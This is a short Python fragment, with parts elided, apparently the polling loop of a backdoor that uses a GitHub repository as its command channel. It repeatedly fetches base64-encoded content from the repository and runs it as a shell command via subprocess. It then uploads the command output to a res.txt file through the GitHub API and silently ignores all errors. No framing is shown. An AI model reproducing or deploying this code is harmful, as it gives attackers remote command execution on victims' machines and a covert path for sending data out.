...
while True:
    try:
        ...
        c=base64.b64decode(d["content"]).decode(errors="replace")
        if c and c!=last:
            last=c
            o=subprocess.run(["sh","-c",c],capture_output=True,text=True,timeout=120)
            ...
            api(f"https://api.github.com/repos/{REPO}/contents/res.txt","PUT",json.dumps({"message":"res","content":res,**({"sha":sha} if sha else {})}))
    except Exception: pass
    time.sleep(15)
